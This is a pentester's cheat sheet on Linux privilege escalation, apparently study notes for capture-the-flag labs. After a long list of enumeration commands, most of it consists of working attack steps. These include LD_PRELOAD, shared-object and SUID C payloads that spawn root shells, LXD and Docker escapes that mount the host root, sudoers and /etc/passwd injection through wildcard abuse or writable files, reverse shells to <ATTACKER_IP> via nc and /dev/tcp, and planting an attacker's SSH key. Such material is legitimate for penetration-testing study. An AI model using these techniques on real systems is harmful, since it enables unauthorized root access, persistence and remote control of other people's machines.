# LINUX PRIVILEGE ESCALATION


## Enumeration

1. What am I
    - `hostname`
    - `whoami`
    - `id -a`
2. OS Version
    - `/etc/issue`
    - `/etc/os-release`
2. Kernel Version
    - `lscpu`
    - `/proc/version` - system kernel version information and additional data about compilers e.g. GCC
    - `uname -a`
    - `lsmod` - enumerate loaded kernel modules
        - `/sbin/modinfo <MODULENAME>` - find out more info about a module
    - `linpeas.sh` - find vulnerable CVEs 
        - E.g. DirtyPipe (CVE-2022-0847)
            - `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git`
            - `bash compile.sh` (on target machine)
            - `./exploit-1` --> Set root user password to "piped" in /etc/passwd and get interactive shell then restore /etc/password.original
            - `./exploit-2` --> Run SUID binary as root, e.g. /bin/sudo
        - E.g. Netfilter:
            - CVE-2021-22555: Versions 2.6 - 5.11 https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
            - CVE-2022-25636: Versions 5.4 - 5.6.10 https://github.com/Bonfee/CVE-2022-25636.git
            - CVE-2023-32233: Versions <= 6.3.1 - https://github.com/Liuk3r/CVE-2023-32233
3. Running Processes + Services
    - `ps` - **check out who b runnin what, check for root**
    - `ps -A` - for all running processes
    - `ps axjf` - view process tree
    - `ps aux [| grep root]` - show processes for `a`ll users, display the `u`ser that launched the process and show processes that are not attached to a tty (`x`)
    - `watch -n 1 "ps -aux | grep pass"` - anything running with 'pass' in it?
    - Some common vulnerable services include:
        - Nagios
        - Exim
        - Samba
        - ProFTPd 
    - `find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"` - for each process, read the command line command that was used to execute this process. translate space characters to new lines
4. Installed Services, Applications, Packages and Versions
    - `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list` - list of installed packages, reformat output and save to file
    - `for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done` - neat one liner to identify vulnerable binaries using GTFObins
    - `ls -l /bin /usr/bin /usr/sbin | tee installed_binaries.list` - list installed binaries, may include stuff not present in packages
    - `dpkg -l`
5. Logged in users
    - `lastlog` - last login info for users
    - `who` or `finger` to see who is currently logged in
6. User Home Directories
    - `ls -al`
7. SSH Directory Contents
    -  `ls .ssh`
8. Bash History Contents
    - `history`
    - `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null` - find special files ending in _history
9. Bash Configuration
    - `bash --version`
    - `~/.bashrc` - look for exports
9. Sudo
    - `sudo -V` get the sudo version
        - Some versions like 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33) are vulnerable to https://github.com/blasty/CVE-2021-3156
        - Other versions like 1.8.28 might be vulnerable to https://www.sudo.ws/security/advisories/minus_1_uid/, when we `sudo -u#-1 <CMD>` to root
        - Also look at https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156
        - TL;DR check the version for vulnerablities.
    - `sudo -l` sudoer capability commands
10. Polkit Version
    - `/usr/bin/pkexec --version` --> if 0.105-26 <= version < 0.117-2, then try CVE-2021-4034 "PwnKit": 
10. Configuration Files or other files of interest
    - `ls -al /tmp /var/tmp /dev/shm` - stores temporary data but retention varies on directory (e.g. /tmp stores for 10 days, /var/tmp 30), check for logs or other interesting stuff
    -  `find` - search for files e.g.
        - `find / -name flag1.txt 2>/dev/null`
        - `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <USER>` - find all hidden files for user
        - `find / -type d -name ".*" -ls 2>/dev/null | grep <USER>` - find all hidden directories files for user
        - `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null` - find configuration files
        - `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"` - find scripts (omit src, snap and share scripts)
        - Any ZIPs we can crack passwords for? Try unzipping with `unzip` AND `7z` to see if there's a password and then `zip2john` it.
    - `grep -r -l 'NAME' /` - look for text within a file starting from a path (recursive search)
11. User and Group Data
    - `/etc/passwd`
        - Users with `/usr/sbin/nologin` are system services and this configuration blocks attempts to login locally or remotely, but you may still be able to gain access via auxiliary exploits, like web shells or priv esc
    - `/etc/shadow`
    - `/etc/group`
    - `getent group <GROUP>` - get localgroup members
12. Password policies
12. Cron Jobs
    -`ls -lah /etc/cron*`
    - `crontab -l`
        - If you `sudo` this, then you see jobs run by root
    - `cat /etc/crontab`
13. File systems + drives
    - `mount` to see all mounts, `cat /etc/fstab` - list drives mounted at boot time  //always check for unmounted drives? might be able to mount partitions and search for info. might also have creds
    - `lsblk` to view all available disks too
    - `cat /etc/fstab`
        - `cat /etc/fstab | grep -v "#" | column -t` to view unmounted filesystems
14. SETUID + SETGID Permissions
15. Writable Directories
        - `find / -writable -type d 2>/dev/null`
16. Writable Files
        - `find / -writable -type f 2>/dev/null`
17. Environment Variables + PATH
    - `env` - show environment variables
    - `echo $PATH`
    - `env | grep PATH`
18. Network and Routing configuration
    - `/etc/hosts` and `/etc/resolv.conf`
    -  `ifconfig` or `ip a`
    - `ss -ntplu` and `ss -anp`
    - `netstat -ano`
        - `netstat -a` - shows all listening ports and already established connections
        - `netstat -at` and `netstat -au` - for above but TCP/UDP ports only
        - `netstat -l` - list ports in 'listening' mode which are open and ready to accept incoming connections
        - `netstat -p` - PID info
        - `netstat -s` - usage statistics
        - `netstat -i` - interface statistics
        - `netstat -n` - do not resolve names (quicker)
        - `netstat -o` - display timers
    - `route` or `routel` or `netstat -rn`
    - `ipstables` (requires `sudo`)
        1. Can try viewing `/etc/iptables` if no permissions
        2. Can also search for file generated by `iptables-save` with `grep`
    - `ip route`
    - `arp -a` - get ARP table to check other targets the host has been talking to, cross-referebce against SSH private keys?
    - `strace ping -c 1 <TARGET>` - view stack traces for a program which might have a password or token.
    - `lpstat` - printer info
21. Shells
    - `/etc/shells`

and the most privilege escalatory command of them all, to switch user:
- `su - <USER>`


### Automation

- UNIX-PRIVESC-CHECK http://pentestmonkey.net/tools/audit/unix-privesc-check
- LinEnum https://github.com/rebootuser/LinEnum
- linPEAS https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS


## Application Functions

Some applications have functions which can be exploited. E.g. apache2 has an option to support alternative server configuration files. Trying to specify a sensitive file like `/etc/shadow` will bring up an error message but expose first line of file.


## Writable Files

If an important file is writable, we can abuse for privelege escalation:
```
victim@hacked:~$ openssl passwd <PASSWORD>
victim@hacked:~$ echo "root2:<PASSWORD_HASH>:root:/root:/bin/bash" >> /etc/passwd
victim@hacked:~$ su root2
```

because if enabled for backwards compatibility, the hash in the password hash field takes precendence over /etc/shadow.


## Shared Libraries (LD_PRELOAD)

Shared libraries are like dynamically linked libraries which are loaded and executed by the associating program at runtime. These end in `.so` files. The way we specify which library to execute at runtime can be achieved through several means but here are some good examples:
- Using `-rpath` and `-rpath-link` flags when compiling a program
- Using environmental variables, like `LD_RUN_PATH` or `LD_LIBARY_PATH`
- Placing library in `/lib/` r `/usr/lib/` directories
- Specifying another directory containing the libraries in `/etc/ld.so.conf`
- **Exploit `LD_PRELOAD`** which is an environment variable which can loiad a library before executing the binary. Functions offered by this loaded library are prioritised over the default ones.

We can list shared libraries required by a binary with ldd:
```
target@hacked:~$ ldd /bin/<BINARY_FILE>
```

We can also see if LD_PRELOAD is enabled with `sudo -l` and checking if `env_keep` is enabled.

We can make a C program to set uid and gid to root, then spawn a shell. To see if available, enter `sudo -l` and check if `env_keep` is enabled. If it's possible then execute commands as **sudo** then: 
1. `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` - compile stuffs to shared loader library
2. `sudo LD_PRELOAD=/home/uer/ldpreload/shell.so <program>` - execute program but load stuffs first 

We can use this payload template for shell.c:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```


## Shared Object Hijacking

Shared objects are like libraries that applications consume in build / runtime.

We can try to find any non-standard libaries being used by the program using `ldd`:

```
target@hacked:~$ ldd <PROGRAM_OR_BINARY_NAME>
```

If we find a non-standard library being used, we can find the path of the library using:

```
target@hacked:~$ readelf -f <PROGRAM_OR_BINARY_NAME> | grep PATH
```

If the directory path is writable, we can abuse and replace with our payload. Note: the payload name **must** be the same as that listed in the `ldd` command.

First we need to know what function is being called by the main program so we know how to craft the exploit. We can do this by:
1. Copying an existing legit shared object library to the target library e.g. `cp /lib/x86_64-linux-gnu/libc.so.6 /path/to/hijack/<PROGRAM_OR_BINARY_NAME>`
2. Observe the error thrown when running main: `... undefined symbol: somefunc`

Then our payload can look like this:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void somefunc() {
    printf("Malicious library loaded UwU\n");
    setuid(0);
    setgid(0);
    system("/bin/bash");
} 
```

Compile the payload and run the main program: `gcc payload.c -fPIC -shared -o /path/to/hijack/<PROGRAM_OR_BINARY_NAME>`


## Python Library Hijacking

### Wrong Write Permissions

We can examine scripts that have SUID bits enabled to see what libararies they are importing. We can then write a privilege escalation payload if these libraries are writable.

We need to make sure we're using the correct function that is being used by the script. Identify it and then `grep -r "def <FUNCTION_NAME>" /usr/local/lib/<PYTHON_VERSION_DIRECTORY>/dist-packages/<LIBRARY_NAME>/*` to find the vulnerable file.

We can then check file perms and edit the vulnerable file, such as `__init__.py` to dump the payload at the start of the vulnerable subroutine:

```
import os
os.system('payload here, such as id')
```

Then run the python program with escalated privileges.

### Library Pathing Abuse

We can inspect the PYTHONPATH listing via the following command:

```
python -c 'import sys; print("\n".join(sys.path))'
```

We can then inspect, for a given library, the default library path via the following: `pip3 show <LIBRARY_NAME>`

We can try to abuse the path priority by creating a library with the same name and used functions and embed a privesc payload in there. We need write permissions to the higher priority path.

### PYTHONPATH Environment Variable

PYTHONPATH = Environment variable that dicates what directory/ies Python can search for modules to import.

If this variable can be altered while executing the python script, then we can redirect the module search to a directory under our control and escalate privileges that way.

E.g., if we have a limited sudo capability for Python that allows us to set environments, we do the following:

```
// Check sudo permissions
target@hacked:~$ sudo -l
...
User target may run the following commands on hacked:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
...

// Alter the path to include /tmp/
target@hacked:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./<PYTHON_SCRIPT>
```


## SUID & SGID

(SetUID), same thing also applies to SGIDs

If `ls -l` shows the s user bit flag is set for a certain files, the file will execute with the same privileges as the file owner. Pray its root and then ggs. Exploitable default files can be found at https://gtfobins.github.io.
- `find / -type f -perm -04000 -ls 2>/dev/null` (SUID)
- `find / -type f -perm -u=s 2>/dev/null` (SUID)
- `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` (SUID)
- `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` (SGID)


## Capabilities

Similar to above: increases privilege levels of specific process or binary.
- GTFOBins good for this too
- `getcap -r / 2>/dev/null`
- `/usr/sbin/getcap -r / 2>/dev/null`
- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`

There is also the sudo capabilities for the user you're signed into:
- `sudo -l`

Tip: use full path of capability binary to avoid collisions.


## Privileged Groups & Containers

`id -a` for group memberships, or check `/etc/group`

### LXD / LXC

LXC = Linux Containers = Application container.

LXD = Linux Daemon = System-level container.

LXD is Ubuntu's container manager. When it is installed, all users are added to the LXD group. Being a member of this group can allow us to escalate privileges by:
- Creating an LXD container
- Making it privileged
- Accessing the host filesystem from within the /mnt/root directory in the container.

Unzip Alpine image, initialise LXD and import image

```
hacked@target:~$ unzip alpine.zip       # Unzips to .tar.gz
hacked@target:~$ lxc image import alpine.tar.gz alpine.tar.gz alpine.tar.gz.root --alias alpine
hacked@target:~$ lxc image list
```

Start privileged container with security.privileged set to TRUE without a UID mapping to make the host / guest root the same user

```
hacked@target:~$ lxc init alpine <CONTAINER_NAME> -c security.privileged=true
```

Mount host file system

```
// <CONTAINER_NAME> and <MOUNT_NAME> can be arbitrary

hacked@target:~$ lxc config device add <CONTAINER_NAME> <MOUNT_NAME> disk source=/ path=/mnt/root recursive=true
```

Spawn a shell in the container to browse host file system as root

```
hacked@target:~$ lxc start <CONTAINER_NAME>
hacked@target:~$ lxc exec <CONTAINER_NAME> /bin/bash
```

### Docker

1. Shared folders (volume mounts) allow us to browse through the host file system - maybe we can find some creds or keys that let us access the host directly?
    - Can read existing shares OR mount our own share:
    - E.g. Mounting root drive:

      Create new Docker instance in `/root` directory of host machine:

      ```
      hacked@target:~$ docker run -v /root:/mnt -it ubuntu
      ```

      Can use this to browse and read SSH keys for the root user. We can also try the same process in `/etc` to read /etc/shadow or other restricted bypass areas.

      Can also write too(?)

2. Sockets
    - The raw network communications stream between daemon and us. Occurs either in a unix socket or network socket depending on configured setup.
    - There is a tool that lets us communicate directly with it:
      
      ```
      // RUN FROM WITHIN CONTAINER

      target@hacked-container:/app$ curl https://master.dockerproject.org/linux/x86_64/docker -o docker
      target@hacked-container:/app$ chmod +x docker
      target@hacked-container:/app$ /tmp/docker -H unix:///app/docker.sock ps        # For UNIX sockets unix://

      // MAP HOST ROOT DIRECTORY TO CONTAINER DIRECTORY /hostsystem
      target@hacked-container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d privileged -v /:/hostsystem <IMAGE>

      // EXPLOIT
      target@hacked-container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it <CONTAINERID>
      root@hacked-container-id:/app$ cat /hostsystem/root/.ssh/id_rsa
      ```

3. Niche case: when the docker socket, usually at `/var/run/docker.sock` is writable, then we can still abuse this to escalate privileges, even if we are not in the Docker or root groups or have sudo/SUID access to Docker:
   
   ```
   docker-user@hacked:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubtuntu chroot /mnt bash
   
   root@container:~# whoami
   root@container:~# id -a
   root@container:~# ls -al
   ```

### Disk

User in disk group have fill access to any devices in /dev file system, such as `/dev/sda1` (often main device for OS).

Can use `debugfs` to read/write to file system as root user. Look for SSH keys, shadow / passwd files or other likely credential locations.

### ADM

Not as flashy as the above, but can be used to read `/var/log`.


## Cron Jobs

That thing where the system automates certain scripts or binaries at specific points in time. They run with privileges of file owner by default: if a file owned by root or a higher privileged user is found then exploit it.

`cat /etc/crontab`

`grep "CRON" /var/log/syslog`

This reverse shell might be handy

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f" >> <VULNERABLE_FILE>`

https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs

pspy is a cool tool that let's you snoop running processes without needing root / admin privileges. We can run this to scan every second and try to determine if there are any cron job executions happening. It can do this by reading `procfs` at specified intervals.

https://github.com/DominicBreuker/pspy

```
target@hacked:~$ ./pspy64 -pf -i 1000       // 1000ms = 1sec
```

Cheeky payload that might help: `echo "USERHERE ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers` otherwise do reverse shell.

## System PATH

When we enter a program into the command line, the system will search PATH for executable binaries. Multiple exploit vectors here:
- Do we have write access to any programs/binaries in system PATH owned by root/higher privilege user
- Can the PATH itself be changed?

For example, if we can write to `/tmp` and it's already in/we have added this location to the system PATH then we can write a script e.g. in C to change user/group ID to root. Compile the source code to an object file, name this object file something e.g. 'kebab'. Enter `kebab` into command line and ggs.


## Passive Traffic Capture

If `tcpdump` is enabled, we can capture and analyse network traffic, which might include credentials, SNMP community strings or other secrets!

We can feed the output from tcpdump into other tools to examine the data on the wire:
- https://github.com/DanMcInerney/net-creds
- https://github.com/lgandx/PCredz

It may also be possible to capture Active Directory traffic like Net-NTLMv2, SMBv2 or Kerberos hashes.

Cleartext protocols like HTTP, FTP, SMTP, POP, IMAP, telnet etc. may also leak secrets.


## NFS

Port 2049, TCP and UDP.

We can review available shared mounts (shares) externally from our attacking machine via `showmount -e <TARGET>` - it's sorta like `smbclient` but for linux. 

Internally, if we take a look at `/etc/exports` we'll find any wirtable shares (shared directories) exposed to network mounting connection requests.

If in the properties there is a `no_root_squash` option for any of these mountable drive then we can mount the drive from our attacker machine **as local root**:

```
link@kali:~$ sudo mount -t nfs <TARGET_IP>:<TARGET_MOUNT> /mnt
link@kali:~# cp shell /mnt/
link@kali:~# chmod u+s /mnt/shell
```

Then write a file with malicious code like the C script and save it to the mounting directory share space **with SUID bits** enabled.

```
target@hacked:~$ /path/to/mount/shell
```

E.g. malicious SUID script:

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

Running this file from target user@target machine will escalate privileges to root and can spawn a shell.


## Hijacking tmux

The `tmux` terminal multiplexer application may have a process running as root (or other privileged user) set up with weak permissions, which can be hijacked

Achieved as per below, which:
1. Creates a new shared session: `tmux -s /shared new -s debugsess`
2. Modifies the ownership: `chown root:devs /shareds`
    - To hijack the above example, we need to have access to the `devs` group. We can replace `devs` which another group X that we have access to.
3. Now we can check processes: `ps aux | grep tmux`
4. Then confirm permissions have been set: `ls -al /shareds`
5. And finally escalate privileges: `tmux -S /shareds`


## Logrotate / Logrotten

Logrotate is responsible for rotating old logs into minimised files, archives or straight up deleting them to conserve space.

In some versions and with some pre-requisites met, it is possible to force a race condition to write files to any directory. This is because, you can replace the directory logrotate writes the log files to in the race window with a symbolic link to any arbitrary directory. The exploit leverages this to write to `/etc/bash_completion.d` as root allowing us to escalate privileges.

This exploit is known as logrotten and we can use this tool for it (need to compile the `logrotten.c` file on target or system with similar kernel to target).

https://github.com/whotwagner/logrotten

Pre-requisites:
1. Version (`logrotate --version`) is either
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0
2. Logrotate must run as root or privileged user
3. Need write permissions on the log files
    - Check if logs are writable by reviewing files for each log class in `/etc/logrotate.d/*`
4. Logrotate must use an option that creates files (e.g. create, compress, copy) - can check this by checking `/etc/logrotate.conf` and seeing what option it's running, try grepping the vulnerable options?
    - **Note:** Sometimes this isn't the default configuration in use, try searching for different config files with `find`.
    - Or check for writable log files with `find` or linPEAS. To confirm it's in scope for logrotate, try writing to the file and seeing if after some time it gets emptied. Then you know it's being rotated.

```
target@hacked:~$ git clone https://github.com/whotwagner/logrotten
target@hacked:~$ cd logrotten && gcc logrotten.c -o logrotten
target@hacked:~$ echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > payload
target@hacked:~$ ./logrotten -p ./payload /tmp/tmp.log
```
https://ivanitlearning.wordpress.com/2021/04/17/hackthebox-book/


## Public Exploits

Depending on PRECISE OS ENUMERATION, can attempt a Kernel exploit (could be dangerous tho).

Kernal enumeration: `uname -r` (and also `arch` for architecture).

Can also exploit local services listening on loopback interface for privesc.


## File Systems

Mounting / unmounting file systems requires root privileges but it is worth it as it can have cool info on it.

To view currently mounted file systems, do `df -h` to see directory mappings.

To see unmounted file systems: `cat /etc/fstab | grep -v '#' | column -t` - these might have creds!


## Wildcard Abuse

Certain wildcard characters can be used as placeholders for other characters. This is interpreted by the shell first, before applications in the command.

This means we can trick the command into interpreting our maliciously injected payload.

E.g. with `tar`, suppose we have a frequent cron job like `cd /home/hacked && tar -zcf /home/hacked/backup.tar.gz *` to backup files and archive them. The wildcard will select all files in the directory, so let's create 3 files:

```
hacked@target:~$ echo 'echo "<USERNAME> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
hacked@target:~$ touch --  "--checkpoint-action=exec=sh root.sh"
hacked@target:~$ touch -- --checkpoint=1
```

- Line 1 is a script to give no-password sudo rights to our user HACKED.
- Line 2 will be interpreted by the tar command earlier as a tar command line argument which will configure the execution action script path
- Line 3 is the argument which will trigger script execution

and you get root.


## Escaping Reverse Shells

### Command Injection

If the input is passed to a command as an argument e.g.

```
ls -l `$input`
```

If we pass the input `pwd`, then it will execute and list contents for the present working directory of the shell's context.


### Command Substitution

Try to embed another command within the shell's context, such as enclosing the payload in backticks or `$()` this thing.

### Command Chaining

Try chaining with `;` or `|`, `&`?

### Environment Variables

Check if the environment variables are used by the shell's execution for commands that are not restricted, e.g. if the shell uses an environment variable to set the shell's working directory.

### Shell Functions

Try defining a shell function with otherwise-restricted commands and seeing if calling the function will allow you unrestricted execution.

### SSH bypass

If connecting to the restricted shell via ssh, try this instead:

```
// Forces bash without any profile restrictions

link@kali:~$ ssh target@hacked -t "bash --noprofile"
```


## Attacker public RSA key access

```
hacked@target:~$ mkdir -p ~/.ssh
hacked@target:~$ chmod 700 ~/.ssh

hacked@target:~$ echo "ssh-rsa AAAB43NDhdfC6 ... DS5dJH45Sh== link@kali" >> ~/.ssh/authorized_keys

# Note, may need to check target SSH config
# Ensure PermitRootLogin yes is set if connecting as root
# PasswordAuthentication no to use key access only
hacked@target:~$ cat /etc/ssh/ssh_config

hacked@target:~$ sudo systemctl restart ssh

link@kali:~$ ssh victim@target_ip
```